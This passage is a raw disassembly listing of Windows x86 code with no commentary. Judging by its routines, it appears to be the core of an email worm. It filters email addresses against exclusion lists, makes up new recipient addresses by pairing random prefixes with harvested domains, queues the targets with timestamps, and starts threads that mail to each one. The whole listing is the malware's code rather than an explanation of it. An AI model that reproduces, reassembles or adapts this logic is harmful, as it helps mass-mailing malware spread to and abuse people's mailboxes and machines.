		push	dword ptr [eax]
		lea	eax, [ebp+var_100]
		push	eax
		call	sub_802ECE
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_804054
		add	esi, 4
		mov	eax, esi
		cmp	dword ptr [esi], 0
		jnz	short loc_804031

loc_80404F:				; CODE XREF: sub_803FD5+1Bj
					; sub_803FD5+53j
		xor	eax, eax

loc_804051:				; CODE XREF: sub_803FD5+82j
		pop	esi
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804054:				; CODE XREF: sub_803FD5+6Ej
		xor	eax, eax
		inc	eax
		jmp	short loc_804051
sub_803FD5	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_804059	proc near		; CODE XREF: sub_80411A+62p

String1		= byte ptr -100h

		push	ebp
		mov	ebp, esp
		sub	esp, 100h
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	edi, eax
		xor	esi, esi

loc_80406B:				; CODE XREF: sub_804059+36j
		mov	al, [edi]
		cmp	al, bl
		jz	short loc_804091
		cmp	al, 40h
		jz	short loc_804091
		movsx	eax, al
		push	eax		; int
		call	ds:tolower
		mov	[ebp+esi+String1], al
		inc	esi
		inc	edi
		cmp	esi, 0FFh
		pop	ecx
		jl	short loc_80406B

loc_804091:				; CODE XREF: sub_804059+16j
					; sub_804059+1Aj
		cmp	byte ptr [edi],	40h
		mov	[ebp+esi+String1], bl
		jnz	short loc_80410E
		cmp	ds:dword_8012A8, ebx
		jz	short loc_8040C8
		mov	eax, offset dword_8012A8
		mov	esi, eax

loc_8040AC:				; CODE XREF: sub_804059+6Dj
		push	dword ptr [eax]	; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcmpA
		test	eax, eax
		jz	short loc_804115
		add	esi, 4
		mov	eax, esi
		cmp	[esi], ebx
		jnz	short loc_8040AC

loc_8040C8:				; CODE XREF: sub_804059+4Aj
		push	3
		lea	eax, [ebp+String1]
		push	offset aSpm	; "spm"
		push	eax
		call	sub_802F70
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_804115
		cmp	ds:dword_801308, ebx
		jz	short loc_80410E
		mov	eax, offset dword_801308
		mov	esi, eax

loc_8040F1:				; CODE XREF: sub_804059+B3j
		push	dword ptr [eax]
		lea	eax, [ebp+String1]
		push	eax
		call	sub_802ECE
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_804115
		add	esi, 4
		mov	eax, esi
		cmp	[esi], ebx
		jnz	short loc_8040F1

loc_80410E:				; CODE XREF: sub_804059+42j
					; sub_804059+8Fj
		xor	eax, eax

loc_804110:				; CODE XREF: sub_804059+BFj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804115:				; CODE XREF: sub_804059+64j
					; sub_804059+87j ...
		xor	eax, eax
		inc	eax
		jmp	short loc_804110
sub_804059	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_80411A	proc near		; CODE XREF: sub_80418A+22p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		push	esi
		call	sub_803B98
		test	eax, eax
		pop	ecx
		jz	short loc_804164

loc_80412C:				; CODE XREF: sub_80411A+53j
					; sub_80411A+5Ej
		xor	eax, eax
		inc	eax
		jmp	short loc_804187
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804131:				; CODE XREF: sub_80411A+4Dj
		call	sub_803E39
		test	eax, eax
		mov	[ebp+var_4], eax
		jz	short loc_80416F
		push	esi
		call	strlen
		pop	ecx
		jmp	short loc_804153
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804146:				; CODE XREF: sub_80411A+3Aj
		mov	cl, [eax+esi]
		cmp	cl, 40h
		jz	short loc_804156
		cmp	cl, 2Eh
		jz	short loc_804156

loc_804153:				; CODE XREF: sub_80411A+2Aj
		dec	eax
		jns	short loc_804146

loc_804156:				; CODE XREF: sub_80411A+32j
					; sub_80411A+37j
		test	eax, eax
		jle	short loc_804169
		add	eax, esi
		cmp	byte ptr [eax],	2Eh
		jnz	short loc_804169
		and	byte ptr [eax],	0

loc_804164:				; CODE XREF: sub_80411A+10j
		cmp	byte ptr [esi],	0
		jnz	short loc_804131

loc_804169:				; CODE XREF: sub_80411A+3Ej
					; sub_80411A+45j
		cmp	[ebp+var_4], 0
		jnz	short loc_80412C

loc_80416F:				; CODE XREF: sub_80411A+21j
		mov	eax, esi
		call	sub_803FD5
		test	eax, eax
		jnz	short loc_80412C
		mov	eax, esi
		call	sub_804059
		neg	eax
		sbb	eax, eax
		neg	eax

loc_804187:				; CODE XREF: sub_80411A+15j
		pop	esi
		leave
		retn
sub_80411A	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_80418A	proc near		; CODE XREF: sub_804253+C2p
					; sub_8047AC+DAp ...

String		= byte ptr -100h
arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 100h
		push	[ebp+arg_0]
		call	strlen
		cmp	eax, 80h
		pop	ecx
		ja	short loc_8041B5
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+String]
		call	sub_80411A
		test	eax, eax
		jz	short loc_8041BA

loc_8041B5:				; CODE XREF: sub_80418A+17j
		xor	eax, eax
		inc	eax
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8041BA:				; CODE XREF: sub_80418A+29j
		push	esi
		mov	esi, ds:dword_80824C
		push	edi
		jmp	short loc_8041DC
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8041C4:				; CODE XREF: sub_80418A+54j
		lea	eax, [ebp+String]
		push	eax		; lpString2
		lea	eax, [esi+0Ah]
		push	eax		; lpString1
		call	ds:lstrcmpiA
		test	eax, eax
		jz	short loc_80420A
		mov	esi, [esi+6]

loc_8041DC:				; CODE XREF: sub_80418A+38j
		test	esi, esi
		jnz	short loc_8041C4
		lea	eax, [ebp+String]
		push	eax		; lpString
		call	ds:lstrlenA
		mov	edi, eax
		add	edi, 0Fh
		push	edi		; dwBytes
		push	esi		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapAlloc
		mov	esi, eax
		test	esi, esi
		jnz	short loc_80420F
		inc	eax
		jmp	short loc_80424F
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80420A:				; CODE XREF: sub_80418A+4Dj
		push	2
		pop	eax
		jmp	short loc_80424F
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80420F:				; CODE XREF: sub_80418A+7Bj
		push	edi
		push	0
		push	esi
		call	memset
		and	byte ptr [esi+5], 0
		add	esp, 0Ch
		call	ds:GetTickCount
		mov	[esi+1], eax
		mov	al, [ebp+arg_4]
		mov	[esi], al
		lea	eax, [ebp+String]
		push	eax
		lea	eax, [esi+0Ah]
		push	eax
		call	strcpy
		mov	eax, ds:dword_80824C
		pop	ecx
		mov	[esi+6], eax
		pop	ecx
		mov	ds:dword_80824C, esi
		xor	eax, eax

loc_80424F:				; CODE XREF: sub_80418A+7Ej
					; sub_80418A+83j
		pop	edi
		pop	esi
		leave
		retn
sub_80418A	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_804253	proc near		; CODE XREF: sub_804578+11Bp

var_180		= dword	ptr -180h
String2		= byte ptr -80h

		push	ebp
		mov	ebp, esp
		sub	esp, 180h
		mov	eax, ds:dword_80824C
		push	esi
		xor	esi, esi
		test	eax, eax
		jz	loc_80431C

loc_80426C:				; CODE XREF: sub_804253+1Fj
		mov	eax, [eax+6]
		inc	esi
		test	eax, eax
		jnz	short loc_80426C
		test	esi, esi
		jz	loc_80431C
		call	sub_802EB8
		xor	edx, edx
		xor	ecx, ecx
		div	esi
		mov	eax, ds:dword_80824C
		test	edx, edx
		jle	short loc_8042A0

loc_804290:				; CODE XREF: sub_804253+4Bj
		test	eax, eax
		jz	loc_80431C
		mov	eax, [eax+6]
		inc	ecx
		cmp	ecx, edx
		jl	short loc_804290

loc_8042A0:				; CODE XREF: sub_804253+3Bj
		test	eax, eax
		jz	short loc_80431C
		add	eax, 0Ah
		jmp	short loc_8042AF
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8042A9:				; CODE XREF: sub_804253+60j
		cmp	cl, 40h
		jz	short loc_8042BA
		inc	eax

loc_8042AF:				; CODE XREF: sub_804253+54j
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_8042A9
		cmp	cl, 40h
		jnz	short loc_80431C

loc_8042BA:				; CODE XREF: sub_804253+59j
		inc	eax
		push	7Fh		; iMaxLength
		push	eax		; lpString2
		lea	eax, [ebp+String2]
		push	eax		; lpString1
		call	ds:lstrcpynA
		call	sub_802E9C
		movzx	eax, ax
		push	3
		xor	edx, edx
		pop	ecx
		div	ecx
		lea	eax, [ebp+var_180]
		push	ds:off_801344[edx*4] ; lpString2
		push	eax		; lpString1
		call	ds:lstrcpyA
		mov	esi, ds:lstrcatA
		lea	eax, [ebp+var_180]
		push	offset a@	; lpString2
		push	eax		; lpString1
		call	esi ; lstrcatA
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		lea	eax, [ebp+var_180]
		push	eax		; lpString1
		call	esi ; lstrcatA
		lea	eax, [ebp+var_180]
		push	1
		push	eax
		call	sub_80418A
		pop	ecx
		pop	ecx

loc_80431C:				; CODE XREF: sub_804253+13j
					; sub_804253+23j ...
		pop	esi
		leave
		retn
sub_804253	endp


;  S U B	R O U T	I N E 


sub_80431F	proc near		; CODE XREF: sub_80441A+6p
					; sub_80441A+38p

lpString2	= dword	ptr  8

		push	esi
		mov	esi, ds:dword_808254
		jmp	short loc_80433D
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804328:				; CODE XREF: sub_80431F+20j
		push	[esp+lpString2]	; lpString2
		lea	eax, [esi+10h]
		push	eax		; lpString1
		call	ds:lstrcmpiA
		test	eax, eax
		jz	short loc_804345
		mov	esi, [esi+4]

loc_80433D:				; CODE XREF: sub_80431F+7j
		test	esi, esi
		jnz	short loc_804328
		xor	eax, eax
		pop	esi
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804345:				; CODE XREF: sub_80431F+19j
		mov	eax, esi
		pop	esi
		retn
sub_80431F	endp


;  S U B	R O U T	I N E 


sub_804349	proc near		; CODE XREF: sub_80441A+32p

lpString2	= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, ds:dword_808254
		push	ebx
		push	esi
		xor	ebx, ebx
		xor	esi, esi
		xor	ecx, ecx
		cmp	eax, ebx
		push	edi
		jz	short loc_804385

loc_80435B:				; CODE XREF: sub_804349+2Aj
		cmp	[eax], ebx
		jnz	short loc_80436D
		cmp	esi, ebx
		jz	short loc_80436B
		mov	edx, [esi+8]
		cmp	edx, [eax+8]
		jnb	short loc_80436D

loc_80436B:				; CODE XREF: sub_804349+18j
		mov	esi, eax

loc_80436D:				; CODE XREF: sub_804349+14j
					; sub_804349+20j
		mov	eax, [eax+4]
		inc	ecx
		cmp	eax, ebx
		jnz	short loc_80435B
		cmp	ecx, 400h
		jle	short loc_804385
		cmp	esi, ebx
		jz	short loc_80439F
		cmp	[esi], ebx
		jz	short loc_8043E1

loc_804385:				; CODE XREF: sub_804349+10j
					; sub_804349+32j
		mov	edi, 90h
		push	edi		; dwBytes
		push	ebx		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapAlloc
		mov	esi, eax
		cmp	esi, ebx
		jnz	short loc_8043A4

loc_80439F:				; CODE XREF: sub_804349+36j
		xor	eax, eax
		inc	eax
		jmp	short loc_804416
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8043A4:				; CODE XREF: sub_804349+54j
		push	edi
		push	ebx
		push	esi
		call	memset
		mov	eax, [esp+18h+arg_4]
		add	esp, 0Ch
		mov	[esi+0Ch], eax
		lea	eax, [esi+10h]
		push	7Fh		; iMaxLength
		push	[esp+10h+lpString2] ; lpString2
		push	eax		; lpString1
		call	ds:lstrcpynA
		call	ds:GetTickCount
		mov	[esi+8], eax
		mov	[esi], ebx
		mov	eax, ds:dword_808254
		mov	[esi+4], eax
		mov	ds:dword_808254, esi
		jmp	short loc_804414
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8043E1:				; CODE XREF: sub_804349+3Aj
		lea	edi, [esi+10h]
		mov	dword ptr [esi], 1
		mov	[edi], bl
		call	ds:GetTickCount
		push	dword ptr [esi+0Ch]
		mov	[esi+8], eax
		call	sub_803B75
		pop	ecx
		push	7Fh		; iMaxLength
		push	[esp+10h+lpString2] ; lpString2
		push	edi		; lpString1
		call	ds:lstrcpynA
		mov	eax, [esp+0Ch+arg_4]
		mov	[esi], ebx
		mov	[esi+0Ch], eax

loc_804414:				; CODE XREF: sub_804349+96j
		xor	eax, eax

loc_804416:				; CODE XREF: sub_804349+59j
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_804349	endp


;  S U B	R O U T	I N E 


sub_80441A	proc near		; CODE XREF: sub_80446C+38p

arg_0		= dword	ptr  8

		push	esi
		mov	esi, [esp+arg_0]
		push	esi
		call	sub_80431F
		test	eax, eax
		pop	ecx
		jz	short loc_80442E
		inc	dword ptr [eax]
		pop	esi
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80442E:				; CODE XREF: sub_80441A+Ej
		push	edi
		push	esi
		call	sub_803B61
		mov	edi, eax
		pop	ecx
		test	edi, edi
		jnz	short loc_80444A
		call	ds:GetTickCount
		test	al, 3
		jz	short loc_80444A

loc_804446:				; CODE XREF: sub_80441A+4Bj
		xor	eax, eax
		jmp	short loc_804469
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80444A:				; CODE XREF: sub_80441A+20j
					; sub_80441A+2Aj
		push	edi
		push	esi
		call	sub_804349
		push	esi
		call	sub_80431F
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_804467
		push	edi
		call	sub_803B75
		pop	ecx
		jmp	short loc_804446
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804467:				; CODE XREF: sub_80441A+42j
		inc	dword ptr [eax]

loc_804469:				; CODE XREF: sub_80441A+2Ej
		pop	edi
		pop	esi
		retn
sub_80441A	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_80446C	proc near		; CODE XREF: sub_8044DC+1Bp

String1		= byte ptr -80h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 80h
		push	edi
		mov	edi, [ebp+arg_0]
		add	edi, 0Ah
		mov	eax, edi
		jmp	short loc_804486
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804480:				; CODE XREF: sub_80446C+1Ej
		cmp	cl, 40h
		jz	short loc_804491
		inc	eax

loc_804486:				; CODE XREF: sub_80446C+12j
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_804480
		cmp	cl, 40h
		jnz	short loc_8044D9

loc_804491:				; CODE XREF: sub_80446C+17j
		push	esi
		inc	eax
		push	7Fh		; iMaxLength
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcpynA
		lea	eax, [ebp+String1]
		push	eax
		call	sub_80441A
		mov	esi, eax
		pop	ecx
		test	esi, esi
		jz	short loc_8044D8
		push	edi
		call	sub_8062CA
		mov	edi, eax
		pop	ecx
		test	edi, edi
		jz	short loc_8044CF
		push	edi
		push	dword ptr [esi+0Ch]
		call	sub_806B4F
		pop	ecx
		pop	ecx
		push	edi		; hMem
		call	ds:GlobalFree

loc_8044CF:				; CODE XREF: sub_80446C+4Fj
		mov	eax, [esi]
		test	eax, eax
		jle	short loc_8044D8
		dec	eax
		mov	[esi], eax

loc_8044D8:				; CODE XREF: sub_80446C+42j
					; sub_80446C+67j
		pop	esi

loc_8044D9:				; CODE XREF: sub_80446C+23j
		pop	edi
		leave
		retn
sub_80446C	endp


;  S U B	R O U T	I N E 


; DWORD	__stdcall sub_8044DC(LPVOID)
sub_8044DC	proc near		; DATA XREF: sub_804578+C2o

arg_0		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, offset Addend
		push	edi		; lpAddend
		call	ds:InterlockedIncrement
		mov	esi, [esp+arg_0]
		test	esi, esi
		jz	short loc_804501
		push	esi
		mov	byte ptr [esi+5], 1
		call	sub_80446C
		pop	ecx
		mov	byte ptr [esi+5], 2

loc_804501:				; CODE XREF: sub_8044DC+14j
		cmp	ds:Addend, 0
		jbe	short loc_804511
		push	edi		; lpAddend
		call	ds:InterlockedDecrement

loc_804511:				; CODE XREF: sub_8044DC+2Cj
		push	0		; dwExitCode
		call	ds:ExitThread
		pop	edi
		pop	esi
sub_8044DC	endp


;  S U B	R O U T	I N E 


sub_80451B	proc near		; CODE XREF: sub_804578+7Fp
		push	esi
		mov	esi, ds:dword_80824C
		push	edi
		mov	edi, offset dword_80824C
		jmp	short loc_804571
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80452A:				; CODE XREF: sub_80451B+58j
		cmp	byte ptr [esi+5], 2
		jnz	short loc_804550
		call	ds:GetTickCount
		sub	eax, [esi+1]
		xor	edx, edx
		mov	ecx, 3E8h
		div	ecx
		lea	ecx, [eax+5]
		test	ecx, ecx
		jl	short loc_804557
		cmp	eax, 2A30h
		jg	short loc_804557

loc_804550:				; CODE XREF: sub_80451B+13j
		lea	edi, [esi+6]
		mov	esi, [edi]
		jmp	short loc_804571
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804557:				; CODE XREF: sub_80451B+2Cj
					; sub_80451B+33j
		mov	ecx, [esi+6]
		mov	eax, esi
		push	eax		; lpMem
		mov	[edi], ecx
		mov	esi, [esi+6]
		push	0		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapFree

loc_804571:				; CODE XREF: sub_80451B+Dj
					; sub_80451B+3Aj
		test	esi, esi
		jnz	short loc_80452A
		pop	edi
		pop	esi
		retn
sub_80451B	endp ; sp =  4


;  S U B	R O U T	I N E 


sub_804578	proc near		; CODE XREF: sub_8046BBp

var_8		= dword	ptr -8
ThreadId	= dword	ptr -4

		push	ecx
		push	ecx
		push	ebx
		push	ebp
		push	esi
		push	edi
		xor	edi, edi
		mov	ds:Addend, edi
		jmp	short loc_80459C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804588:				; CODE XREF: sub_804578+2Bj
		push	1		; dwMilliseconds
		call	sub_804BAC
		mov	dword ptr [esp+0], 4074h

loc_804596:				; CODE XREF: sub_804578+B2j
					; sub_804578+E1j ...
		call	ds:Sleep

loc_80459C:				; CODE XREF: sub_804578+Ej
		call	sub_803108
		test	eax, eax
		jz	short loc_804588
		xor	esi, esi
		xor	ebx, ebx
		xor	ebp, ebp
		xor	eax, eax
		cmp	edi, 1
		setz	al
		push	eax
		call	sub_804BAC
		mov	eax, ds:dword_80824C
		pop	ecx
		test	eax, eax
		mov	[esp+18h+var_8], esi
		jz	short loc_804610

loc_8045C7:				; CODE XREF: sub_804578+75j
		inc	ebx
		cmp	byte ptr [eax+5], 0
		jnz	short loc_8045DB
		inc	ebp
		test	esi, esi
		jz	short loc_8045D9
		mov	cl, [esi]
		cmp	cl, [eax]
		jle	short loc_8045DB

loc_8045D9:				; CODE XREF: sub_804578+59j
		mov	esi, eax

loc_8045DB:				; CODE XREF: sub_804578+54j
					; sub_804578+5Fj
		mov	ecx, [eax+1]
		cmp	ecx, [esp+18h+var_8]
		jb	short loc_8045E8
		mov	[esp+18h+var_8], ecx

loc_8045E8:				; CODE XREF: sub_804578+6Aj
		mov	eax, [eax+6]
		test	eax, eax
		jnz	short loc_8045C7
		cmp	ebx, 1FA0h
		jl	short loc_804610
		call	sub_80451B
		xor	edi, edi
		cmp	ebp, 400h
		jle	short loc_804612
		inc	edi
		push	edi
		call	sub_804BAC
		pop	ecx
		jmp	short loc_804612
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804610:				; CODE XREF: sub_804578+4Dj
					; sub_804578+7Dj
		xor	edi, edi

loc_804612:				; CODE XREF: sub_804578+8Cj
					; sub_804578+96j
		xor	eax, eax
		cmp	ebp, eax
		jz	short loc_80466C
		cmp	esi, eax
		jz	short loc_80466C
		cmp	ds:Addend, 0Ch
		jb	short loc_80462F
		push	0C8h
		jmp	loc_804596
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80462F:				; CODE XREF: sub_804578+ABj
		lea	ecx, [esp+18h+ThreadId]
		mov	byte ptr [esi+5], 1
		push	ecx		; lpThreadId
		push	eax		; dwCreationFlags
		push	esi		; lpParameter
		push	offset sub_8044DC ; lpStartAddress
		push	eax		; dwStackSize
		push	eax		; lpThreadAttributes
		call	ds:CreateThread
		test	eax, eax
		jz	short loc_80465E
		cmp	eax, 0FFFFFFFFh
		jz	short loc_80465E
		push	eax		; hObject
		call	ds:CloseHandle
		push	32h
		jmp	loc_804596
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80465E:				; CODE XREF: sub_804578+D1j
					; sub_804578+D6j
		mov	byte ptr [esi+5], 2
		push	320h
		jmp	loc_804596
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80466C:				; CODE XREF: sub_804578+9Ej
					; sub_804578+A2j
		push	2
		pop	edi
		push	eax
		call	sub_804BAC
		cmp	ebx, 3
		pop	ecx
		jl	short loc_80469F
		cmp	[esp+18h+var_8], 0
		jz	short loc_80469F
		call	ds:GetTickCount
		sub	eax, [esp+18h+var_8]
		cmp	eax, 15F90h
		jb	short loc_80469F
		call	sub_804253
		push	78h
		jmp	loc_804596
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80469F:				; CODE XREF: sub_804578+101j
					; sub_804578+108j ...
		push	352h
		jmp	loc_804596
sub_804578	endp


;  S U B	R O U T	I N E 


sub_8046A9	proc near		; CODE XREF: sub_802CB2:loc_802D3Cp
		xor	eax, eax
		mov	ds:dword_80824C, eax
		mov	ds:Addend, eax
		mov	ds:dword_808254, eax
		retn
sub_8046A9	endp


;  S U B	R O U T	I N E 


; DWORD	__stdcall sub_8046BB(LPVOID)
sub_8046BB	proc near		; DATA XREF: sub_802CB2+95o
		call	sub_804578
		push	0		; dwExitCode
		call	ds:ExitThread
		int	3		; Trap to Debugger
sub_8046BB	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8046C9	proc near		; CODE XREF: sub_8048A0+79p

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		cmp	[ebp+arg_4], 0
		mov	eax, [ebp+arg_0]
		jle	short loc_8046EE
		mov	edx, [ebp+arg_4]

loc_8046DB:				; CODE XREF: sub_8046C9+23j
		movzx	ecx, byte ptr [eax]
		mov	cl, ds:byte_801738[ecx]
		test	cl, cl
		jz	short loc_8046EA
		mov	[eax], cl

loc_8046EA:				; CODE XREF: sub_8046C9+1Dj
		inc	eax
		dec	edx
		jnz	short loc_8046DB

loc_8046EE:				; CODE XREF: sub_8046C9+Dj
		push	ebx
		push	esi
		push	edi

loc_8046F1:				; CODE XREF: sub_8046C9+D6j
		xor	esi, esi
		cmp	[ebp+arg_4], esi
		mov	[ebp+var_8], esi
		jl	loc_80478B

loc_8046FF:				; CODE XREF: sub_8046C9+BCj
		push	2
		mov	edi, offset dword_801840
		pop	ebx
